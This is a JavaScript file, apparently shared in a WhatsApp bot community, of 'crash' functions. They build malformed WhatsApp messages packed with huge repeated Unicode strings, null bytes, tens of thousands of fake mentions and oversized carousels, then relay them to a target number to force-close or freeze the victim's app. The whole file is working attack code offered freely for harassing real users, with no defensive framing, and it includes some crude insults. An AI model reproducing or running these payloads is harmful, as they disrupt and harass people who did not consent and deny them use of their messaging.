/*
💯 Source : https://whatsapp.com/channel/0029VafXmrW6buMLxerpel2W
© Rizxvelz Official - Extorditcv
❗Notes : Function Ini Di share secara free/gratis jadi jika ada yang menjual nya kalian langsung katain aja "hama anj jual function free lawak wkwk"
*/
////////////////// FUCK MARK - FORCLOSE //////////////////
async function ForceFast(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Extorditcv",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Extorditcv - Project",
              newsletterJid: "33333333333333333@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Extorditcv - Crash",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://rizxvelz.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "The Extorditcv",
              hasMediaAttachment: false
            },
            body: {
              text: "The Extorditcv",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "About : https://t.me/rizxvelzdev",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "About : https://t.me/rizxvelzdev",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: apiClient + "About : https://t.me/rizxvelzdev"
                },
                {
                  name: "payment_status",
                  buttonParamsJson: apiClient + "About : https://t.me/rizxvelzdev"
                },
                {
                  name: "review_order",
                  buttonParamsJson: apiClient + "About : https://t.me/rizxvelzdev"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function ForceBlank(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Extorditcv",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Extorditcv - Project" + "ꦽ".repeat(120000),
              newsletterJid: "33333333333333333@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Extorditcv - Crash",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://rizxvelz.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "The Extorditcv",
              hasMediaAttachment: false
            },
            body: {
              text: "᭡꧈".repeat(90000) + "࣯ꦾ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Extorditcv - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "\u0000".repeat(9999),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "\u0000".repeat(9999),
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: apiClient + "\u0000".repeat(9999)
                },
                {
                  name: "payment_status",
                  buttonParamsJson: apiClient + "\u0000".repeat(9999)
                },
                {
                  name: "review_order",
                  buttonParamsJson: apiClient + "\u0000".repeat(9999)
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "Vampire",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VampSpamFc(sock, target) {
  sock.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "Crashed\n" + "Extorditcv-Hayy".repeat(9000) + "@5".repeat(9000),
          hasMediaAttachment: false
        },
        body: {
          text: "ꦾ".repeat(9000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            { name: "single_select", buttonParamsJson: venomModsData + "\u0003" },
            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003" },
            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003", voice_call: "call_galaxy" },
            { name: "form_message", buttonParamsJson: venomModsData + "\u0003" },
            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003" },
            { name: "send_location", buttonParamsJson: venomModsData + "\u0003" },
            { name: "view_product", buttonParamsJson: venomModsData + "\u0003" },
            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003" },
            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003" },
            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003" },
            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003" }
          ]
        }
      }
    },
    { participant: { jid: target } }
  );
}

async function VampFcSpam(target) {
    sock.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
                    title: "Extorditcv - Crash",
                    hasMediaAttachment: false
                },
                body: {
                    text: "ꦾ".repeat(90000) + "@8".repeat(90000),
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                        { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                    ]
                }
            }
        },
        { participant: { jid: target } }
    );
}
////////////////// FUCK MARK - UI_BLANK //////////////////
async function newsLetter(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "33333333333333333@newsletter",
                        newsletterName: "This Extorditcv - Crash" + "ꦾ".repeat(120000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                        nativeFlowMessage: {},
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: `{"title":"LOCK🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# BOOM̷","rows":[]}]}`,
                            },
                        ],
                        mentionedJid: ["254742491666@s.whatsapp.net"],
                    },
                },
            },
        };

        await sock.relayMessage(target, messsage, { userJid: target });
    } catch (err) {
        console.log('err');
    }
}

async function newsLetter1(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "33333333333333333@newsletter",
                        newsletterName: "SUPER © EXTORDITCV" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000
                    }
                }
            }
        };
        await sock.relayMessage(target, messsage, { userJid: target });
    } catch (err) {
        console.log('eror');
    }
}

async function TagNull(sock, target) {
      let virtex = "EXTORDITCV - CRASH";

      const messagePayload = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "ꦾ".repeat(50000),
                  url:
                    "https://api.whatsapp.com/send?phone=+🧸&text=" +
                    "@1".repeat(103000),
                  sequenceNumber: 0,
                  jpegThumbnail: "",
                },
                hasMediaAttachment: true,
                contactVcard: true,
              },
              body: {
                text: virtex + "@1".repeat(88000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@broadcast"),
                groupMentions: [
                  {
                    groupJid: "1@broadcast",
                    groupSubject: virtex,
                  },
                ],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "EXTENSIONS_7",
                    },
                    nativeFlowResponseMessage: {
                      name: "custom_message",
                      paramsJson: `{
        "screen_2_OptIn_0": true,
        "screen_2_OptIn_1": true,
        "screen_1_Dropdown_0": "HKC-QI-0",
        "screen_0_Dropdown_1": "HK-9999",
        "screen_1_DatePicker_1": "1028995200000",
        "screen_1_TextInput_2": "TamaXyz@BugAviliable.com",
        "screen_1_TextInput_4": "https://www.google.com/",
        "screen_1_TextInput_5": "https://api.whatsapp.com/send?phone=+🧸&text="+"@1".repeat(90000),       
        "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "${"\u0003".repeat(55000)}",
        "screen_0_TextInput_1": "HK-3001",
        "screen_0_TextInput_2": "HK-6666",
        "screen_0_TextInput_3": "HK-3004",
        "screen_4_TextInput_8": "0x80048820",
        "screen_0_TextInput_4": "HK-3005",
        "screen_0_TextInput_5": "HK-3000",
        "screen_0_TextInput_6": "HK-3002",
        "screen_0_TextInput_7": "HK-3005",
        "screen_0_TextInput_8": "HK-3006",
        "screen_0_TextInput_9": "HK-3008",
        "screen_0_TextInput_10": "HK-1001",
        "screen_1_TextInput_0": "HK-2002",
        "screen_2_TextInput_0": "HK-5005",
        "screen_3_TextInput_0": "HK-3003",
        "screen_5_TextInput_0": "Doomsday-2024",
        "screen_0_Dropdown_2": "0.0.9_#AmpasWKWK",
        "screen_0_Dropdown_3": "HK-0001",
        "screen_0_Dropdown_4": "Doomsday-2024",
        "screen_3_EmojiBombCrash_004": "😹".repeat(10000),
        "flow_token": "AQAAAAAULTIMATE_CRASH_TOKEN_TaMaXyZ_X9Y7Z41_FINIXTRASH."
    }`,
                      version: 3,
                    },
                  },
                },
              },
            },
            isForwarded: true,
            share_payment_status: true,
          },
        },
        messageParamsJson: "\u0000".repeat(55000),
      };

      sock.relayMessage(target, messagePayload, {
        participant: { jid: target },
        messageId: null,
      });
    }
////////////////// FUCK MARK - CAROUSEL //////////////////
async function Carousel(target) {
    for (let i = 0; i < 1020; i++) {
        try {
            let push = [];
            for (let i = 0; i < 1020; i++) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: '*Extorditcv Was Here!*',
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                            fileLength: "10840",
                            height: 10,
                            width: 10,
                            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1721344123",
                            jpegThumbnail: ""
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
                });
            }

            const carousel = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}ExtorditcvExtorditcvExtorditcvExtorditcv\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "About Me: bio.link/crash" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, {});

            await sock.relayMessage(target, carousel.message, {
                participant: { jid: target }
            });

        } catch (err) {
            console.error("Error in Fkod:", err);
        }
    }
}

async function Carousel2(sock, target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: "https/image/crash" },
    { upload: sock.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: 'à¸„Æ¿à«¦à¥®à¸„Õ†×¢Æ¿àª½à«¯ à¹‘ áƒªà¸„à¥®Ò›',
    gifPlayback: false,
    subtitle: 'à¸„Æ¿à«¦à¥®à¸„Õ†×¢Æ¿àª½à«¯ à¹‘ áƒªà¸„à¥®Ò›',
    hasMediaAttachment: true
  });

  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "à¸„Æ¿à«¦à¥®à¸„Õ†×¢Æ¿àª½à«¯ à¹‘ áƒªà¸„à¥®Ò›"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com"
            })
          }
        ]
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "à¸„Æ¿à«¦à¥®à¸„Õ†×¢Æ¿àª½à«¯ à¹‘ áƒªà¸„à¥®Ò›"
            },
            footer: {
              text: "à¸„Æ¿à«¦à¥®à¸„Õ†×¢Æ¿àª½à«¯ à¹‘ áƒªà¸„à¥®Ò›"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );
  
  await sock.relayMessage(
    target,
    msg.message
      ? { participant: { jid: target, messageId: null } }
      : {}
  );
}

////////////////// FUCK MARK - PROTOCOL //////////////////
async function VampBroadcast(sock, target, mention) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Extorditcv-Ceo",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "33333333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "ꦽ".repeat(120000)
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "soker tai" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug(sock, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@extorditcv",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await sock.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗧𝗮𝗺𝗮 - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function protocolbug3(sock, target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "DreadosTex" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "DreadosFortex",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝚢𝚊𝚑𝚊𝚑𝚊 𝚗𝚐𝚎𝚕𝚊𝚐",
                    footerText: "𝙳𝚛𝚎𝚊𝚍𝚘𝚜𝙵𝚘𝚛𝚝𝚎𝚡 𝚒𝚜 𝚋𝚊𝚌𝚔 ༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "⟅̊༑ ▾𝚖𝚊𝚔𝚕𝚞⟅̊༑ ▾ " },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }



        async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "𝚖𝚊𝚗𝚞𝚜𝚒𝚊 𝚕𝚎𝚖𝚊𝚑",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await sock.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await sock.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "DreadosFortex is back ▾" },
                             content: undefined
}
]
}
);
}
}